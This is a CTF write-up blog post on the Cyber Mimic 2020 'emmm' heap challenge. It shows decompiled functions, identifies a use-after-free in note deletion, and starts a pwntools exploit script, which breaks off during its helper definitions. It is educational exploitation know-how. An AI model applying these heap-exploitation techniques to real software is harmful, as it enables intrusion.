@@ -1,0 +1,453 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         Cyber Mimic 2020 emmm Writeup
+        
+    </title><meta content="Cyber Mimic 2020 emmm Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/emmm/&t=Cyber Mimic 2020 emmm Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Cyber Mimic 2020 emmm Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-06-21</time></div></div><section class=body><p>This is yet another challenge that we solved during this weekend's Cyber Mimic 2020 and the current post is supposedly the intended solution for this challenge.<h2 id=tl-dr-of-the-challenge-binary>TL;DR OF THE CHALLENGE BINARY</h2><p>We've been given a standard <em>x86 64-bit</em> Dynamically linked binary along with <strong>glibc 2.23</strong> to begin with.<p>Here's what <em>checksec</em> has to say.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>CANARY    </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>FORTIFY   </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>NX        </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>PIE       </span><span style=color:#bfbab0cc>: </span><span>ENABLED
+</span><span>RELRO     </span><span style=color:#bfbab0cc>: </span><span>FULL
+</span><span>
+</span></code></pre><h2 id=reversing>REVERSING</h2><p>Firing it up in <em>Ghidra</em> , we see that the binary is a standard CTF-style menu driven binary with the following options.<ol><li><strong>Add Note</strong> - <ul><li>Checks if the <em>allocated_count</em> is less than <strong>0x15</strong> and then finds an empty slot for our allocation by iterating through the bss table corresponding to allocated chunks.<li>It then calls <strong>malloc</strong> of <strong>0x10</strong> and then adds it to the corresponding slot in the bss table.<li><strong>Size</strong> is further requested which is checked for being less than <strong>0x2ff</strong> and then another malloc of <strong>size</strong> is called whose address is stored in the first offset of the <strong>0x10</strong> chunk.<li><strong>size</strong> bytes are read into this chunk of user defined size and then the size is stored at the second offset of our <strong>0x10</strong> chunk followed by an increment in <strong>allocated_count</strong>.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#ff7733>long</span><span> lVar1</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>void </span><span style=color:#f29668>**</span><span>ppvVar2</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>int</span><span> iVar3</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> lVar4</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>pvVar5</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> lVar6</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> in_FS_OFFSET</span><span style=color:#bfbab0cc>;
+</span><span>  
+</span><span>  lVar1 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  lVar4 </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>(allocated_count </span><span style=color:#f29668>< </span><span style=color:#f29718>0x15</span><span>) {
+</span><span>    </span><span style=color:#ff7733>do </span><span>{
+</span><span>      lVar6 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>long</span><span>)(</span><span style=color:#ff7733>int</span><span>)lVar4</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>if </span><span>((</span><span style=color:#f29668>&</span><span>header)[lVar4 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>] </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>      lVar4 </span><span style=color:#f29668>=</span><span> lVar4 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    } </span><span style=color:#ff7733>while </span><span>(lVar4 </span><span style=color:#f29668>!= </span><span style=color:#f29718>0x15</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    pvVar5 </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(</span><span style=color:#f29718>0x10</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>**</span><span>)(</span><span style=color:#f29668>&</span><span>header </span><span style=color:#f29668>+</span><span> lVar6 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>=</span><span> pvVar5</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"Size:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    iVar3 </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#f29718>0x2ff </span><span style=color:#f29668><</span><span> iVar3 </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span style=color:#ff7733>U</span><span>) {
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Too large!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>      </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    ppvVar2 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>**</span><span>)(</span><span style=color:#f29668>&</span><span>header)[lVar6 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>]</span><span style=color:#bfbab0cc>;
+</span><span>    pvVar5 </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>((</span><span style=color:#ff7733>long</span><span>)iVar3)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f29668>*</span><span>ppvVar2 </span><span style=color:#f29668>=</span><span> pvVar5</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>header)[lVar6 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>] </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) {
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"malloc error"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>      </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"Note:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>**</span><span>)(</span><span style=color:#f29668>&</span><span>header)[lVar6 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>]</span><span style=color:#bfbab0cc>,</span><span>(</span><span style=color:#ff7733>long</span><span>)iVar3)</span><span style=color:#bfbab0cc>;
+</span><span>    allocated_count </span><span style=color:#f29668>=</span><span> allocated_count </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>int </span><span style=color:#f29668>*</span><span>)((</span><span style=color:#f29668>&</span><span>header)[lVar6 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>] </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>=</span><span> iVar3</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(lVar1 </span><span style=color:#f29668>== *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)) {
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Success~"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>else </span><span>{
+</span><span>    </span><span style=color:#ff7733>if </span><span>(lVar1 </span><span style=color:#f29668>== *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)) {
+</span><span>      </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>  }
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>  </span><span style=color:#ffb454>__stack_chk_fail</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><ol start=2><li><strong>Delete Note</strong> - <ul><li>Checks if <strong>allocated_count</strong> is less than <strong>0x15</strong> , asks for <em>unsigned int</em> <strong>index</strong> and checks if the bss entry corresponding to the requested <strong>index</strong> is NULL or not.<li>If not , then it prints the content of the note.<li>Finally it frees the <strong>header</strong> chunk of size <strong>0x10</strong> , <em>without nulling out the bss entry</em>.</ul></ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=color:#ff7733>long</span><span> lVar1</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=font-style:italic;color:#39bae6>uint</span><span> uVar2</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> in_FS_OFFSET</span><span style=color:#bfbab0cc>;
+</span><span>  
+</span><span>  lVar1 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>(allocated_count </span><span style=color:#f29668>< </span><span style=color:#f29718>0x15</span><span>) {
+</span><span>    </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"Index:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    uVar2 </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if </span><span>(uVar2 </span><span style=color:#f29668>< </span><span style=color:#f29718>0x15</span><span>) {
+</span><span>      </span><span style=color:#ff7733>if </span><span>((undefined8 </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>header)[(</span><span style=color:#ff7733>long</span><span>)(</span><span style=color:#ff7733>int</span><span>)uVar2 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>] </span><span style=color:#f29668>!= </span><span>(undefined8 </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>0x0</span><span>) {
+</span><span>        </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"You will free: </span><span style=color:#f29718>%s</span><span style=color:#c2d94c> .</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>*</span><span>(undefined8 </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>header)[(</span><span style=color:#ff7733>long</span><span>)(</span><span style=color:#ff7733>int</span><span>)uVar2 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>])</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>free</span><span>((</span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>)(</span><span style=color:#f29668>&</span><span>header)[(</span><span style=color:#ff7733>long</span><span>)(</span><span style=color:#ff7733>int</span><span>)uVar2 </span><span style=color:#f29668>* </span><span style=color:#f29718>8</span><span>])</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>if </span><span>(lVar1 </span><span style=color:#f29668>== *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)) {
+</span><span>          </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Success~"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>          </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>        </span><span style=color:#ff7733>goto</span><span> LAB_5555555552d5</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>if </span><span>(lVar1 </span><span style=color:#f29668>== *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)) {
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span style=color:#59c2ff>LAB_5555555552d5</span><span style=color:#bfbab0cc>:
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>  </span><span style=color:#ffb454>__stack_chk_fail</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span></code></pre><ol start=3><li><strong>Show Note</strong> - <ul><li>This option talks about showing some kind of secret initially.<li>Checks if a flag is null or not.<li>If found null , it goes about asking <em>unsigned int</em> length , checks if length is <strong>0xffffffff</strong> and if <strong>length</strong> is found to be less than <strong>0x17</strong> , it then asks for <strong>input</strong>.<li>Then , it does some math on the global variable <strong>secret</strong> using the <em>long</em> type input that we just passed.<li>It then prints out 0 or 1 depending on condition that is being invoked <strong>input + secret < calc</strong> where <em>calc</em> is <strong>calc = input + secret + input * -4</strong> and it does all this in a while loop which executes for <strong>0xff</strong> times.<li>After breaking out of the <em>do while</em> , it sets a flag in the bss.<li>The function then asks us for a <em>guess</em> which is compared with the <em>secret</em> value.<li>If we pass the comparision , the function further asks for a <em>gender</em> by choosing 1 or 2.</ul></ol><blockquote><p>Honestly I'm not sure if this function is like <em>really</em> useful to us at all at the moment :/</blockquote><p>Anyways , here's the decompilation.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>Show_Note</span><span>(</span><span style=color:#ff7733>void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style=font-style:italic;color:#39bae6>uint</span><span> len</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> input</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> lVar1</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> calc</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>int</span><span> iVar2</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> in_FS_OFFSET</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>int</span><span> local_24</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>long</span><span> local_20</span><span style=color:#bfbab0cc>;
+</span><span>  
+</span><span>  iVar2 </span><span style=color:#f29668>= </span><span style=color:#f29718>0xff</span><span style=color:#bfbab0cc>;
+</span><span>  local_20 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"If you can guess my secret, I will show something for you."</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>(secret_bit </span><span style=color:#f29668>== </span><span style=color:#f29718>0</span><span>) {
+</span><span>    </span><span style=color:#ff7733>do </span><span>{
+</span><span>      </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"length:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      len </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ff7733>if </span><span>(len </span><span style=color:#f29668>== </span><span style=color:#f29718>0xffffffff</span><span>) {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You must have already guess my secret!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>      </span><span style=color:#ff7733>if </span><span>(</span><span style=color:#f29718>0x17 </span><span style=color:#f29668><</span><span> len </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span>) {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You don</span><span style=color:#95e6cb>\'</span><span style=color:#c2d94c>t know me!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>        </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29668>-</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      }
+</span><span>      </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"input:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>      input </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int2</span><span>((ulong)len)</span><span style=color:#bfbab0cc>;
+</span><span>      calc </span><span style=color:#f29668>=</span><span> input </span><span style=color:#f29668>+</span><span> secret </span><span style=color:#f29668>+</span><span> input </span><span style=color:#f29668>* -</span><span style=color:#f29718>4</span><span style=color:#bfbab0cc>;
+</span><span>      </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"output:</span><span style=color:#f29718>%d</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>(ulong)(input </span><span style=color:#f29668>+</span><span> secret </span><span style=color:#f29668><</span><span> calc)</span><span style=color:#bfbab0cc>,</span><span>calc)</span><span style=color:#bfbab0cc>;
+</span><span>      iVar2 </span><span style=color:#f29668>=</span><span> iVar2 </span><span style=color:#f29668>+ -</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    } </span><span style=color:#ff7733>while </span><span>(iVar2 </span><span style=color:#f29668>!= </span><span style=color:#f29718>0</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    secret_bit </span><span style=color:#f29668>= </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ffb454>__printf_chk</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"Your guess:"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  lVar1 </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int2</span><span>(</span><span style=color:#f29718>0x18</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>(lVar1 </span><span style=color:#f29668>!=</span><span> secret) {
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"bye~"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>    </span><span style=color:#f07178>exit</span><span>(</span><span style=color:#f29668>-</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Congratulations!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Please choose your gender. [1:boy] [2:girl]"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ffb454>__isoc99_scanf</span><span>(</span><span style=color:#f29668>&</span><span>DAT_555555555621</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>local_24)</span><span style=color:#bfbab0cc>;
+</span><span>  </span><span style=color:#ff7733>if </span><span>(local_24 </span><span style=color:#f29668>== </span><span style=color:#f29718>1</span><span>) {
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You are a clever boy!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>else </span><span>{
+</span><span>    </span><span style=color:#ff7733>if </span><span>(local_24 </span><span style=color:#f29668>== </span><span style=color:#f29718>2</span><span>) {
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You are a clever girl!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>else </span><span>{
+</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You are a ???"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>if </span><span>(local_20 </span><span style=color:#f29668>!= *</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)(in_FS_OFFSET </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x28</span><span>)) {
+</span><span>                    </span><span style=font-style:italic;color:#5c6773>/* WARNING: Subroutine does not return */
+</span><span>    </span><span style=color:#ffb454>__stack_chk_fail</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>  }
+</span><span>  </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>Now that we have reversed the entire binary , let's get started with hijacking the control flow :).<h2 id=exploit-development>EXPLOIT DEVELOPMENT</h2><p>Well , the bug is clearly evident in the <strong>Delete Note</strong> function which is the infamous <strong>Use After Free</strong>. Hence Heap Leak should be trivial.<h3 id=heap-leak>Heap Leak</h3><p>So we can free the header chunk only and probably double free it too. Hmm, sounds cool for getting our heap leak.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span>
+</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'172.35.29.41'
+</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>9999
+</span><span>
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
+</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
+</span><span style=color:#ff7733>else</span><span>:
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./pwn'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
+</span><span>
+</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
+</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
+</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
+</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
+</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>size</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>note</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Choice >>"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"1"</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Size:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>"Note:"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(note))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Choice >>"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"2"</span><span>)
